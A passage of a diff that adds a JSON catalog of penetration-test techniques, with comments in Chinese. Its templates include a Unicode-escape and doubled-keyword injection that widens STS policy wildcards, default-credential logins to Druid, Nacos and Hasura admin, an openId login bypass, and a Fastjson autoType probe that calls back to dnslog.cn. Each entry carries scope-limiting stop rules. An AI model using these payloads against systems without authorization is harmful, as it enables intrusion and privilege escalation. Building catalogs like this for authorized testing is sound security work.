+      "id": "miniprogram-openid",
+      "category": "miniprogram/auth",
+      "title": "小程序 openId 登录绕过",
+      "assetTypes": [
+        "miniprogram",
+        "web"
+      ],
+      "scenarios": [
+        "web-login",
+        "miniprogram"
+      ],
+      "signals": [
+        "openid",
+        "miniprogram",
+        "login",
+        "小程序"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-openid-pattern",
+      "variants": [
+        {
+          "id": "clown-openid",
+          "source": "clown:authbypass-test.md#空 openId",
+          "label": "空串/假值 openId",
+          "template": "loginByOpenId?openId=",
+          "verify": "进入已有测试账号或返回测试身份",
+          "score": 4,
+          "reason": "覆盖空串和假值，但需小程序入口"
+        },
+        {
+          "id": "report-openid-pattern",
+          "source": "report:miniprogram-auth#388fa62b",
+          "label": "前端身份字段直接签发",
+          "template": "<IDENTITY_FIELD>=<TEST_ACCOUNT_ID>",
+          "verify": "返回测试账号 Token/会话",
+          "score": 5,
+          "reason": "真实报告证明身份字段未绑定会话"
+        }
+      ],
+      "stop": "只用自有测试账号；不枚举 openId；不接管真实用户；发现即停。"
+    },
+    {
+      "id": "mobile-deeplink",
+      "category": "mobile/deeplink",
+      "title": "App DeepLink/WebView 入口",
+      "assetTypes": [
+        "app"
+      ],
+      "scenarios": [
+        "mobile-app",
+        "mobile-webview"
+      ],
+      "signals": [
+        "deeplink",
+        "scheme",
+        "webview",
+        "android",
+        "ios",
+        "鸿蒙"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-mobile-deeplink",
+      "variants": [
+        {
+          "id": "clown-mobile-deeplink",
+          "source": "existing:skills/mobile-app-testing.md#Android/iOS",
+          "label": "自定义 scheme + WebView",
+          "template": "<SCHEME>://<HOST>/<PATH>?url=<CALLBACK>",
+          "verify": "App 打开外部 URL 或 WebView 加载回调",
+          "score": 4,
+          "reason": "沿用现有移动端技能，补充入口验证"
+        }
+      ],
+      "stop": "只在授权测试设备/模拟器；不注入 Hook、不绕过证书固定、不读取真实数据。"
+    },
+    {
+      "id": "cloud-sts-unicode-bypass",
+      "category": "cloud/sts",
+      "title": "STS Policy 过滤器 Unicode/双写绕过",
+      "assetTypes": [
+        "cloud",
+        "web"
+      ],
+      "scenarios": [
+        "web-cloud",
+        "cloud-iam"
+      ],
+      "signals": [
+        "sts",
+        "unicode",
+        "\\u002a",
+        "双写",
+        "bypass",
+        "policy"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "article-unicode",
+      "variants": [
+        {
+          "id": "article-unicode",
+          "source": "note:cloud-sts-policy-article",
+          "label": "Unicode 转义替代 * 和 Action/Resource",
+          "template": "uploads/<USER>/x.txt\"],\"\\u0041ction\":[\"\\u002a\"],\"\\u0052esource\":[\"\\u002a",
+          "verify": "过滤器移除明文 * / Action / Resource 后，JSON 解析器仍还原为通配",
+          "score": 5,
+          "reason": "给出 \\u002a 和键名 Unicode 变体，专门绕过字符串替换式修复"
+        },
+        {
+          "id": "article-double-write",
+          "source": "note:cloud-sts-policy-article",
+          "label": "双写绕过",
+          "template": "ActACtionion / {{",
+          "verify": "替换一次后仍残留 Action / {，二次解析恢复注入结构",
+          "score": 4,
+          "reason": "覆盖非递归替换的修复缺陷"
+        }
+      ],
+      "stop": "只验证策略范围是否扩大；不列桶、不读他人对象、不删除；发现即停。"
+    },
+    {
+      "id": "mobile-android-exported",
+      "category": "mobile/android",
+      "title": "Android 导出组件静态检查",
+      "assetTypes": [
+        "app"
+      ],
+      "scenarios": [
+        "mobile-app"
+      ],
+      "signals": [
+        "android",
+        "exported",
+        "manifest",
+        "component",
+        "intent"
+      ],
+      "risk": "low",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "guide-android-exported",
+      "variants": [
+        {
+          "id": "guide-android-exported",
+          "source": "guide:android-security-guide#exported",
+          "label": "exported/intent-filter 静态判定",
+          "template": "apktool d <APK> -o <DIR>; grep -n 'android:exported=\"true\"' <DIR>/AndroidManifest.xml",
+          "verify": "列出 exported=true 或带 intent-filter 的非 Provider 组件",
+          "score": 5,
+          "reason": "给出导出判定规则和静态命令，覆盖最完整"
+        },
+        {
+          "id": "clown-mobile-exported",
+          "source": "existing:skills/mobile-app-testing.md#Android",
+          "label": "包配置静态审阅",
+          "template": "检查 <PACKAGE> 的导出组件/权限/签名摘要",
+          "verify": "记录组件名、权限与导出状态",
+          "score": 3,
+          "reason": "原则正确，但没有具体命令"
+        }
+      ],
+      "stop": "只做静态审阅；不实际调用导出组件；不重打包、不注入 Hook。"
+    },
+    {
+      "id": "mobile-android-webview",
+      "category": "mobile/android",
+      "title": "Android WebView 配置静态检查",
+      "assetTypes": [
+        "app"
+      ],
+      "scenarios": [
+        "mobile-app",
+        "mobile-webview"
+      ],
+      "signals": [
+        "android",
+        "webview",
+        "javascriptinterface",
+        "fileaccess",
+        "bridge"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "guide-android-webview",
+      "variants": [
+        {
+          "id": "guide-android-webview",
+          "source": "guide:android-security-guide#WebView",
+          "label": "WebView 危险配置静态检索",
+          "template": "grep -rn 'setJavaScriptEnabled\\|addJavascriptInterface\\|setAllowFileAccess\\|setAllowUniversalAccessFromFileURLs' <DECOMPILED_DIR>",
+          "verify": "确认 JS Bridge、文件访问或跨源访问是否开启",
+          "score": 5,
+          "reason": "直接给出危险 API 清单，适合静态审阅"
+        },
+        {
+          "id": "clown-mobile-webview",
+          "source": "existing:skills/mobile-app-testing.md#Android",
+          "label": "WebView/TLS 观察",
+          "template": "审阅 <WEBVIEW> 的 JS、文件访问和 TLS 配置",
+          "verify": "记录配置项与影响面",
+          "score": 3,
+          "reason": "覆盖原则，但缺少具体 API"
+        }
+      ],
+      "stop": "只审阅配置；不注入 JS、不调用 Bridge、不绕过证书固定。"
+    },
+    {
+      "id": "mobile-ios-ats",
+      "category": "mobile/ios",
+      "title": "iOS ATS/URL Scheme 静态检查",
+      "assetTypes": [
+        "app"
+      ],
+      "scenarios": [
+        "mobile-app",
+        "mobile-webview"
+      ],
+      "signals": [
+        "ios",
+        "ats",
+        "plist",
+        "urlscheme",
+        "universal link"
+      ],
+      "risk": "low",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "guide-ios-ats",
+      "variants": [
+        {
+          "id": "guide-ios-ats",
+          "source": "guide:ios-security-guide#overview",
+          "label": "Info.plist ATS/URL Scheme 审阅",
+          "template": "plutil -p <APP>/Info.plist | grep -E 'NSAppTransportSecurity|CFBundleURLSchemes|NSExceptionDomains'",
+          "verify": "列出 ATS 例外域和自定义 URL Scheme",
+          "score": 5,
+          "reason": "覆盖 ATS 例外、URL Scheme 和 Universal Link 入口"
+        },
+        {
+          "id": "clown-ios-ats",
+          "source": "existing:skills/mobile-app-testing.md#iOS",
+          "label": "签名/ATS/权限说明",
+          "template": "检查 <BUNDLE_ID> 的签名、ATS 和权限说明",
+          "verify": "记录配置项",
+          "score": 3,
+          "reason": "原则正确，但没有具体 plist 命令"
+        }
+      ],
+      "stop": "只做静态审阅；不重签、不篡改资源、不越狱、不读取 Keychain。"
+    },
+    {
+      "id": "mobile-harmony-ability",
+      "category": "mobile/harmony",
+      "title": "鸿蒙 NEXT Ability 导出检查",
+      "assetTypes": [
+        "app"
+      ],
+      "scenarios": [
+        "mobile-app"
+      ],
+      "signals": [
+        "harmony",
+        "鸿蒙",
+        "ability",
+        "hdc",
+        "bundle",
+        "exported"
+      ],
+      "risk": "low",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "guide-harmony-ability",
+      "variants": [
+        {
+          "id": "guide-harmony-ability",
+          "source": "guide:harmony-next-guide#overview",
+          "label": "hdc/bm dump + HAP 静态审阅",
+          "template": "hdc shell bm dump -n <BUNDLE_NAME>; 检查 <HAP>/module.json5 的 abilities/exported",
+          "verify": "列出可导出 Ability 及其权限",
+          "score": 5,
+          "reason": "给出 HAP 版本、hdc 命令和 Ability 导出判定"
+        },
+        {
+          "id": "clown-harmony",
+          "source": "existing:skills/mobile-app-testing.md#鸿蒙 NEXT",
+          "label": "HAP/HSP 静态审阅",
+          "template": "检查 <BUNDLE_NAME> 的签名/权限/Ability 导出配置",
+          "verify": "记录配置项与 SDK 版本",
+          "score": 3,
+          "reason": "覆盖原则，但缺少具体命令"
+        }
+      ],
+      "stop": "只做静态审阅；不实际调用 Ability、不跨设备访问、不提取市场凭据。"
+    },
+    {
+      "id": "info-leak-druid",
+      "category": "info-leak/druid",
+      "title": "Druid 监控台默认口令/信息泄露",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-infra",
+        "web-api-json"
+      ],
+      "signals": [
+        "druid",
+        "ruoyi",
+        "monitor",
+        "默认口令",
+        "弱口令"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-druid-exposure",
+      "variants": [
+        {
+          "id": "report-druid-exposure",
+          "source": "report:info-leak-druid#53f21667",
+          "label": "Druid submitLogin 默认口令",
+          "template": "GET <BASE>/druid/login.html; POST <BASE>/druid/submitLogin username=<TEST_USER>&password=<TEST_PASS>",
+          "verify": "进入 Druid 监控台，能看到数据源/会话/SQL 页面",
+          "score": 5,
+          "reason": "真实报告给出若依框架 Druid 默认口令入口和验证页面"
+        },
+        {
+          "id": "clown-info-druid",
+          "source": "clown:info-leak-test.md#常见端点",
+          "label": "常见监控端点",
+          "template": "/druid/index.html /actuator /swagger-ui.html",
+          "verify": "返回监控页面",
+          "score": 3,
+          "reason": "只列端点，没有默认口令和验证判据"
+        }
+      ],
+      "stop": "只尝试一次用户提供的默认口令；不做爆破；不导出 SQL/会话/数据库配置；发现即停。"
+    },
+    {
+      "id": "info-leak-swagger",
+      "category": "info-leak/swagger",
+      "title": "Swagger/OpenAPI 文档暴露",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json",
+        "web-infra"
+      ],
+      "signals": [
+        "swagger",
+        "openapi",
+        "api-docs",
+        "接口文档"
+      ],
+      "risk": "low",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-swagger",
+      "variants": [
+        {
+          "id": "clown-swagger",
+          "source": "clown:info-leak-test.md#常见端点",
+          "label": "常见 API 文档路径",
+          "template": "/swagger-ui.html /v2/api-docs /v3/api-docs /openapi.json",
+          "verify": "返回接口 schema 或 UI",
+          "score": 4,
+          "reason": "覆盖 Swagger 2/3 和 OpenAPI 常见路径"
+        }
+      ],
+      "stop": "只读接口文档；不调用业务写接口；不导出敏感 schema；发现即停。"
+    },
+    {
+      "id": "info-leak-nacos",
+      "category": "info-leak/nacos",
+      "title": "Nacos 配置/默认口令暴露",
+      "assetTypes": [
+        "web",
+        "api",
+        "cloud"
+      ],
+      "scenarios": [
+        "web-api-json",
+        "web-infra",
+        "cloud-iam"
+      ],
+      "signals": [
+        "nacos",
+        "config",
+        "dataid",
+        "默认口令"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-nacos-pattern",
+      "variants": [
+        {
+          "id": "report-nacos-pattern",
+          "source": "report:info-leak-nacos#19a9d4bc",
+          "label": "Nacos 配置读取/默认登录",
+          "template": "GET <BASE>/nacos/v1/cs/configs?dataId=<TEST_DATA_ID>&group=DEFAULT_GROUP; POST <BASE>/nacos/v1/auth/users/login username=<TEST_USER>&password=<TEST_PASS>",
+          "verify": "返回测试配置或登录成功",
+          "score": 4,
+          "reason": "报告样本中 Nacos 出现频率高，给出配置读取和默认登录两个入口"
+        },
+        {
+          "id": "clown-info-nacos",
+          "source": "clown:info-leak-test.md#常见端点",
+          "label": "中间件暴露面",
+          "template": "/nacos/ /nacos/v1/console/health/liveness",
+          "verify": "返回 Nacos 页面/健康信息",
+          "score": 3,
+          "reason": "只做暴露面发现，没有配置读取结构"
+        }
+      ],
+      "stop": "只读测试 dataId；不修改配置、不新增用户、不导出真实配置；发现即停。"
+    },
+    {
+      "id": "framework-fastjson-detect",
+      "category": "injection/deserialization",
+      "title": "Fastjson autoType 检测（仅参考）",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "deserialization",
+        "web-api-json"
+      ],
+      "signals": [
+        "fastjson",
+        "autotype",
+        "@type",
+        "json",
+        "java"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-fastjson-detect",
+      "variants": [
+        {
+          "id": "report-fastjson-detect",
+          "source": "report:injection-deserialization#96727bdd",
+          "label": "autoType DNS 回调检测",
+          "template": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"<UNIQUE_ID>.dnslog.cn\"}",
+          "verify": "回调平台出现 DNS 查询，证明 autoType 被解析",
+          "score": 5,
+          "reason": "报告给出 Fastjson autoType 未限制的完整上下文；检测用 DNS 回调，不执行命令"
+        },
+        {
+          "id": "clown-deser-fastjson",
+          "source": "clown:deserialization-test.md#Java",
+          "label": "Java 反序列化探测",
+          "template": "使用 <GADGET> 生成 DNS 回调 payload",
+          "verify": "回调出现 DNS 请求",
+          "score": 3,
+          "reason": "覆盖 Java 反序列化，但没有 Fastjson @type 结构"
+        }
+      ],
+      "stop": "只做 DNS 回调检测；不加载远程类、不执行命令、不使用完整 RCE gadget；发现即停。"
+    },
+    {
+      "id": "framework-shiro-detect",
+      "category": "auth/shiro",
+      "title": "Shiro rememberMe 检测（仅参考）",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-login",
+        "deserialization"
+      ],
+      "signals": [
+        "shiro",
+        "rememberme",
+        "cookie",
+        "deserialization"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-shiro-detect",
+      "variants": [
+        {
+          "id": "report-shiro-detect",
+          "source": "report:auth-shiro#53f21667",
+          "label": "rememberMe 标记检测",
+          "template": "Cookie: rememberMe=<BASE64_TEST_MARKER>",
+          "verify": "响应 Set-Cookie 出现 rememberMe=deleteMe",
+          "score": 5,
+          "reason": "报告样本出现 rememberMe，检测只判断 Shiro 解析行为，不发送 gadget"
+        },
+        {
+          "id": "clown-shiro",
+          "source": "clown:deserialization-test.md#Java",
+          "label": "Java 反序列化探测",
+          "template": "使用 <GADGET> 生成 DNS 回调 payload",
+          "verify": "回调出现 DNS 请求",
+          "score": 3,
+          "reason": "通用反序列化方法，缺少 Shiro Cookie 结构"
+        }
+      ],
+      "stop": "只做 rememberMe 标记检测；不发送 gadget、不执行命令；发现即停。"
+    },
+    {
+      "id": "cloud-hasura-admin",
+      "category": "cloud/graphql",
+      "title": "Hasura 管理密钥/GraphQL 暴露",
+      "assetTypes": [
+        "cloud",
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "graphql",
+        "cloud-iam"
+      ],
+      "signals": [
+        "hasura",
+        "graphql",
+        "admin-secret",
+        "metadata"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-hasura",
+      "variants": [
+        {
+          "id": "report-hasura",
+          "source": "report:cloud-graphql#2be91a8c",
+          "label": "默认 admin secret 访问 metadata",
+          "template": "POST /v1/metadata  x-hasura-admin-secret: <TEST_SECRET>  {\"type\":\"export_metadata\",\"args\":{}}",
+          "verify": "返回 GraphQL schema/元数据",
+          "score": 5,
+          "reason": "报告给出 Hasura 默认密钥和 metadata 入口；只读 schema，不执行写操作"
+        },
+        {
+          "id": "clown-graphql",
+          "source": "clown:graphql-test.md#Introspection",
+          "label": "GraphQL introspection",
+          "template": "{__schema{types{name}}}",
+          "verify": "返回 schema",
+          "score": 3,
+          "reason": "通用 GraphQL，不覆盖 Hasura 管理密钥"
+        }
+      ],
+      "stop": "只读 schema/元数据；不调用 run_sql、不写表、不导出业务数据；发现即停。"
+    }
+  ]
+}
